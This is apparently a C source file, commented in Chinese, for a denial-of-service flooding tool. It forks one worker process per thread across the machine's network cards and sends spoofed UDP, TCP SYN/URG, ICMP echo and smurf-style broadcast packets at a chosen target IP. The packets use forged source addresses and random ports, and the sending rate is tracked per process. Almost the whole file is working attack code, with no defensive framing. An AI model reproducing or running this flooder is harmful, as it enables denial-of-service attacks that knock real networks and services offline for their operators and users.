#include <stdio.h>
#include <stdlib.h>
#include <net/if.h>
#include <string.h>
#include <aio.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <unistd.h>
#include <signal.h>
#include <sys/times.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include "ip.h"
#include "ctrl.h"
#include"get_gate_mac.h"
//源ip，目的ip在gtk_callback.c中定义的
#include   <unistd.h>  
 // int   usleep(unsigned   int   microseconds);
//int victim_port=-1;
//int child_thread=5;
int seconds=0;
//int sleeptime=0;
int rawsock;
int phy_sock;
struct sockaddr_ll sll_src;
#define NAMELEN 10
int pid[CHLD_MAX]={0};
char att_ip[15];

 int attack_type;
 int fake_num=0;
 #define MAXTIME 1024
extern int pkt_ps[MAXTIME];
extern int pkt_tm;
extern char gate_mac[30];//网关的地址 
extern struct command* cmd; 
int pipe_file[2];
int continue_print=1;
unsigned long long nums[CHLD_MAX]={0};//子进程中统计数量
unsigned long long total_nums=0;//父进程中统计和
unsigned long long total_lastnums=0;
unsigned long long p_nums[CHLD_MAX]={0};//父进程中接收子进程传递来的
void udp(int i);
void tcp(int i);
void icmp(int i);
void smurf(int i);
int signal_print=0;
int rate=0;

//unsigned long long int child_pack_number[CHLD_MAX]={0};

/* -------------------------------------------------------------------- */
int getindexbyname(const char *ifname)
{
	int ret;
	struct ifreq req;
	int sd=socket(PF_INET,SOCK_DGRAM,0);
	strncpy(req.ifr_name,ifname,IFNAMSIZ);
	ret=ioctl(sd,SIOCGIFINDEX,&req);//关键
	close(sd);
	if(ret==-1)
		return -1;
	return req.ifr_ifindex;
}

int getmacbyname(const char* ifname,unsigned char*haddr,unsigned char*haddr_len)
{
	int ret;
	struct ifreq req;
	int sd=socket(PF_INET,SOCK_DGRAM,0);
	strncpy(req.ifr_name,ifname,IFNAMSIZ);
	ret=ioctl(sd,SIOCGIFHWADDR,&req);//关键
	close(sd);
	if(ret==-1)return -1;
	*haddr_len=6;
	memcpy(haddr,&req.ifr_addr.sa_data,6);
	return 0;
}
int getinterface(char   name[][NAMELEN])
{
int fd, intrface, retn ,ret= 0; 

   struct ifreq buf[4]; 
memset(buf,0,4*sizeof(struct ifreq));
   struct arpreq arp; 

   struct ifconf ifc; 

   if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) >= 0) { 

      ifc.ifc_len = sizeof buf; 

      ifc.ifc_buf = (caddr_t) buf; 

      if (!ioctl (fd, SIOCGIFCONF, (char *) &ifc)) { 

         intrface = ifc.ifc_len / sizeof (struct ifreq);
     //   printf("interface num is intrface=%d\n\n\n",intrface); 
	ret=intrface-1;
//	printf("interface=%d\n",intrface);
	int i=0;
         while (intrface-- > 0) 
          {  
            if(strcmp(buf[intrface].ifr_name,(char *)&"lo"))
            {//printf ("net device %s\n", buf[intrface].ifr_name); 
        
		memcpy(name[i],buf[intrface].ifr_name,strlen(buf[intrface].ifr_name));
		name[i++][strlen(buf[intrface].ifr_name)]='\0';
		}
        } 

      } else 

         perror ("cpm: ioctl"); 

   } else 

      perror ("cpm: socket"); 

    close (fd); 

return ret;
}
void flood_comm()                           //攻击函数＊＊
{
	int p,i;
	
	pipe(pipe_file);                   //创建管道，创建成功时返回0，否则返回－1＊＊
	continue_print=1;
	int buf_size_send=1500;
	
	seconds=0;
	char netname[10][NAMELEN];
	int cardnum=getinterface(netname);
	int tmpint;
	for(i=0;i<cmd->threadnumber;i++)
	 {
			
  		 p=fork();                //创建子进程，成功时子进程返回0父进程返回子进程的ID，否则返回－1＊＊
  		 if(!p)
   		 {
			sll_src.sll_family=AF_PACKET;
			tmpint=i%cardnum;
					
			getmacbyname(netname[tmpint],sll_src.sll_addr,&sll_src.sll_halen);
			sll_src.sll_ifindex=getindexbyname(netname[tmpint]);
			printf("in fork %d the netcard is %s\n",i,netname[tmpint]);
			
		/*	if(i%2==0)
			{
			getmacbyname(DEFAULT_ETH,sll_src.sll_addr,&sll_src.sll_halen);
			sll_src.sll_ifindex=getindexbyname(DEFAULT_ETH);
			printf("in fork %d the netcard is %s\n",i,DEFAULT_ETH);
			}
			else 
			{
			getmacbyname("eth0",sll_src.sll_addr,&sll_src.sll_halen);
			sll_src.sll_ifindex=getindexbyname("eth0");
			printf("in fork %d the netcard is %s\n",i,"eth0");
		
			}		
		*/
			phy_sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP));//每个socket在进程里都不相同         创建一个新的套接字＊＊
			setsockopt(phy_sock,SOL_SOCKET,SO_SNDBUF,&buf_size_send,sizeof(buf_size_send));  //设置套接字方式＊＊
	//		int nZero=0;
	//		setsockopt(phy_sock,SOL_SOCKET,SO_SNDBUF,(char *)&nZero,sizeof(nZero)); 
			close(pipe_file[0]);
			void count()
			{
		//		printf("%d is writing\n",i);
				write(pipe_file[1],&nums[i],sizeof(long long));//子进程向管道里写数据
				rate=cmd->rate/cmd->threadnumber;
		//		printf("%d\n",rate);
				alarm(1);			
			}
			signal(SIGALRM,count);
			alarm(1);
			
			
			switch(cmd->type)
		       {
				case 1: tcp(i);  break;
				case 2: udp(i);  break;
				case 3: icmp(i); break;	
				case 4: smurf(i); break;
				default :        break;	
		       }      			                                        
   		 }
   	        pid[i]=p;

	}
	 
		close(pipe_file[1]);
		
		void print_total()
		{	
			int j;
			total_lastnums=total_nums;
			total_nums=0;
            //		printf("Fa is reading\n");
			for(j=0;j<cmd->threadnumber;j++)
			{
				
				read(pipe_file[0],&p_nums[j],sizeof(long long));//父进程从管道里收数据
	//			printf("fa num is %d\n",p_nums[j]);
				total_nums+=p_nums[j];
		//		printf("faaa num is %lld\n",p_nums[j]);
			}
			pkt_ps[pkt_tm]=total_nums;
			pkt_tm++;
		/*	
			if(cmd->rate<total_nums-total_lastnums)
				sleeptime+=10;
			else 	sleeptime-=10;
			if(sleeptime<0) sleeptime=0;*/
			printf("%lld        packets/  %ds   rate:%lld    packets/s\n",total_nums,seconds++,total_nums-total_lastnums);
		//	printf("%d\n",sleeptime);
			if(continue_print)							
			alarm(1);
      		}
		signal(SIGALRM,print_total);
		alarm(1);
		return ;
}

void udp(int i )
{	

//	int pktsize=14+sizeof(struct ip_h)+sizeof(struct udp_h)+getrandom(200,300);

	
	int pktsize= 14+sizeof(struct ip_h)+sizeof(struct udp_h);       //计算数据包的大小＊＊
	if(cmd->pkt_size>pktsize)                                       
	pktsize=cmd->pkt_size; 
	int il;
	extern errno;
	unsigned char udpb[1600];
	static int first_fill=0;
	
	memcpy(udpb,gate_mac,6);	
/*	if(first_fill==0)
	{
		 prmac((u_char*)udpb);
		 first_fill=1;
	}
	*/
	memcpy(&udpb[6],sll_src.sll_addr,6);
        udpb[12]=0x08;
	udpb[13]=0x00;

        struct ip_h *iph=(struct ip_h*)(udpb+14);
	struct udp_h *udph=(struct udp_h*)(udpb+14+sizeof(struct ip_h));

	iph->ihl=5;
 	iph->ver=4;
	iph->tos=0x00;
	iph->tl=htons(pktsize-14);
	iph->id=htons(250);
 //	iph->id=htons(getrandom(1024,65535));
 	iph->off=0;
 	iph->ttl=0;
  	iph->pro=17;//宏UDP
	iph->sum=0;
	iph->dst=cmd->att_ip;
	iph->src=0;
	register int nleft=20;
	 unsigned short *w=(unsigned short *)iph;
	 int tmpsum=0,sum;
	while(nleft>1)
	{
		tmpsum+=*w++;
		nleft-=2;
	}

if(cmd->pkt_size!=-1)//是否随机
while(1)
{
if(rate-->0)
   {	
   //	printf("udploop\n");
	iph->src=fakeip(fake_num);
 	iph->ttl=getrandom(200,255);
 	sum=tmpsum+iph->ttl;
	sum+=(iph->src)&0xffff;
	sum+=(iph->src)>>16;
	sum=(sum>>16)+(sum&0xffff);
	sum +=(sum>>16);
	iph->sum=~sum;
 //	udph->src_port=tmpport++;
 	udph->src_port=htons(getrandom(0,65535));
	if(cmd->port<0)
 		udph->dst_port=htons(getrandom(0,65535));
	else 
		udph->dst_port=htons(cmd->port);	
	udph->len=htons(pktsize-sizeof(struct ip_h)-14);
 	udph->sum=0;
	udph->sum=udptcp_cksum((unsigned char*)iph,pktsize-14);
	il=sendto (phy_sock,udpb,pktsize,0,(struct sockaddr*)&sll_src,sizeof(sll_src));
//	printf("il=%d\n",il);	
//	printf("port=%d  num=%d\n",tmpport,nums[i]);
	if(il>0)
	nums[i]++;
	else 	
	perror("send error:");

   }
   else usleep(0);
 } 
 else
 {//	int tmp=111;
 	iph->tl=htons(0);
 	nleft=20;
 	tmpsum=0;
 	w=(unsigned short *)iph;
 	while(nleft>1)
	{
		tmpsum+=*w++;
		nleft-=2;
	}
 while(1)
 if(rate-->0)
   {	

 	 pktsize=14+sizeof(struct ip_h)+sizeof(struct udp_h)+getrandom(0,1400);
   //	pktsize=14+sizeof(struct ip_h)+sizeof(struct udp_h)+123;
   //	tmp+=1;if(tmp==999) tmp=1;
   	iph->tl=htons((short)(pktsize-14));
	iph->src=fakeip(fake_num);
 	iph->ttl=getrandom(200,255);
 	sum=tmpsum+iph->ttl;
 	sum+=iph->tl;
	sum+=(iph->src)&0xffff;
	sum+=(iph->src)>>16;
	sum=(sum>>16)+(sum&0xffff);
	sum +=(sum>>16);
	iph->sum=~sum;
 	udph->src_port=htons(getrandom(0,65535));
	if(cmd->port<0)
 		udph->dst_port=htons(getrandom(0,65535));
	else 
		udph->dst_port=htons(cmd->port);	
	udph->len=htons(pktsize-sizeof(struct ip_h)-14);
 	udph->sum=0;
	udph->sum=udptcp_cksum((unsigned char*)iph,pktsize-14);
	il=sendto (phy_sock,udpb,pktsize,0,(struct sockaddr*)&sll_src,sizeof(sll_src));
	if(il>0)
	nums[i]++;
	else 	
	perror("send error:");

   }
   else usleep(0);
 }
}


void tcp(int i)
{
	static unsigned char write_buf[200];
	static int first_fill=0;		
	int il;
	 int pktsize=14+sizeof(struct ip_h)+sizeof(struct tcp_h);
	memcpy(write_buf,gate_mac,6);	
	memcpy(&write_buf[6],sll_src.sll_addr,6);
        write_buf[12]=0x08;
	write_buf[13]=0x00;

	struct ip_h *ip=(struct ip_h *)(write_buf+14);
	struct tcp_h *tcp=(struct tcp_h*)(write_buf+14+sizeof(struct ip_h));	
	
	ip->ver=4;
	ip->ihl=5;
	ip->tos=0x00;
	ip->tl=htons(pktsize-14);
	ip->id=htons(250);//打标记
	ip->off=0;
	ip->ttl=0;
	ip->pro=6;//TCP is 6
	ip->sum=0;
	ip->src=0;
	ip->dst=inet_addr(att_ip);
	
	register int nleft=20;
	 unsigned short *w=(unsigned short *)ip;
	 int tmpsum=0,sum;
	while(nleft>1)
	{
		tmpsum+=*w++;
		nleft-=2;
	}
	

	
while(1)
if(rate-->0)
   {
 ;
	ip->ttl=getrandom(200,255);
	ip->src=fakeip(fake_num);
	sum=tmpsum+ip->ttl;
	sum+=(ip->src)&0xffff;
	sum+=(ip->src)>>16;
	sum=(sum>>16)+(sum&0xffff);
	sum +=(sum>>16);
	ip->sum=~sum;

	tcp->src_port=htons(getrandom(0,65535));
	if(cmd->port<0)	
		tcp->dst_port=htons(getrandom(0,65535));
	else
		tcp->dst_port=htons(cmd->port);	
	tcp->seq_no=htonl(getrandom(0,65535)+(getrandom(0,65535)<<8));
	tcp->ack_no=htons(getrandom(0,65535));
	tcp->x2=15;
	tcp->off=5;
	tcp->flag=SYN|URG;
	tcp->wnd_size=htons(getrandom(0,65535));
	tcp->chk_sum=0;
	tcp->urgt_p=htons(getrandom(0,65535));
	
	tcp->chk_sum=udptcp_cksum((unsigned char*)ip,pktsize-14);	
	
	
	il=sendto (phy_sock,write_buf,pktsize,0,(struct sockaddr*)&sll_src,sizeof(struct sockaddr_ll));		
	if(il>0)
	nums[i]++;
	else 	
	perror("send error:");
   }
   else usleep(0);
}


  void icmp(int i)
  {
    int il;   
  //  char *packet;
 //   char *package_data;//发送的数据包里的数据    
    unsigned char write_buf[80];
    static int first_fill=0;

    struct ip_h *iph=(struct ip_h*)(write_buf+14);
    struct icmp_h *icmph=(struct icmp_h*)(write_buf+14+sizeof(struct ip_h));

    int pktsize=14+sizeof(struct ip_h)+sizeof(struct icmp_h)+64;
    //+getrandom(200,400)
	memcpy(write_buf,gate_mac,6);	
/*	if(first_fill==0)
	{
		 prmac((u_char*)write_buf);
		 first_fill=1;
	}

*/
    memcpy(&write_buf[6],sll_src.sll_addr,6);
    write_buf[12]=0x08;
    write_buf[13]=0x00;

     iph->ver=4;
     iph->ihl=5;
     iph->tos=0;
     iph->tl=htons(pktsize-14);//这个是总长度
     iph->id=htons(250);
     iph->off=0;
     
    while(1)
    if(rate-->0)
    {
     iph->ttl=getrandom(200,255);
     iph->pro=1;
     iph->sum=0;
     
     iph->src=fakeip(fake_num);
     iph->dst=inet_addr(att_ip);
    iph->sum=ip_sum((unsigned short int*)iph,sizeof(struct ip_h));
     icmph->type=8;//这里原来的程序用的是宏ICMP_ECHO 定义为8
     icmph->code=0;
     icmph->id=htons(getrandom(1,65535));
     icmph->seq=htons(getrandom(1,65535));
     icmph->sum=0;
     icmph->sum=ip_sum((unsigned short int*)icmph,pktsize-14-sizeof(struct ip_h) );
     il=sendto(phy_sock,write_buf,pktsize,0,(struct sockaddr*)&sll_src,sizeof(sll_src));
	if(il>0)
	nums[i]++;
	else 	
	perror("send error:");  
     }
        else usleep(0);
	
  }


void smurf(int i)
  {
    int il;   
  //  char *packet;
  //  char *package_data;//发送的数据包里的数据    
    unsigned char write_buf[80];
  //  static int first_fill=0;

    struct ip_h *iph=(struct ip_h*)(write_buf+14);
    struct icmp_h *icmph=(struct icmp_h*)(write_buf+14+sizeof(struct ip_h));

    int pktsize=14+sizeof(struct ip_h)+sizeof(struct icmp_h);
    //+getrandom(200,400)
   char all1[6]={0xff,0xff,0xff,0xff,0xff,0xff}; 
	memcpy(write_buf,all1,6);	
/*	if(first_fill==0)
	{
		 prmac((u_char*)write_buf);
		 first_fill=1;
	}

*/
    memcpy(&write_buf[6],gate_mac,6);
    write_buf[12]=0x08;
    write_buf[13]=0x00;

     iph->ver=4;
     iph->ihl=5;
     iph->tos=0;
     iph->tl=htons(pktsize-14);//这个是总长度
     iph->id=htons(250);
     iph->off=0;
     char dst[16];
    while(1)
    if(rate-->0)
    {
     iph->ttl=getrandom(200,255);
     iph->pro=1;
     iph->sum=0;
     iph->src=inet_addr(att_ip);
   
     sprintf (dst, "%d.%d.%d.%d", 255, 255, 255, 255);
     iph->dst=inet_addr(dst);
    iph->sum=ip_sum((unsigned short int*)iph,sizeof(struct ip_h));
     icmph->type=8;//这里原来的程序用的是宏ICMP_ECHO 定义为8
     icmph->code=0;
     icmph->id=htons(getrandom(1,65535));
     icmph->seq=htons(getrandom(1,65535));
     icmph->sum=0;
     icmph->sum=ip_sum((unsigned short int*)icmph,pktsize-14-sizeof(struct ip_h) );
     il=sendto(phy_sock,write_buf,pktsize,0,(struct sockaddr*)&sll_src,sizeof(sll_src));
	if(il>0)
	nums[i]++;
	else 	
	perror("send error:");  
     }
        else usleep(0);
	
  }


void on_stop()//暂停攻击的代码
{ 

   int i;
  
   for(i=0;i<cmd->threadnumber;i++)
   {
	kill(pid[i],SIGKILL); 
	printf("kill pid %d\n",pid[i]); 
	pid[i]=0;
   }
  
}

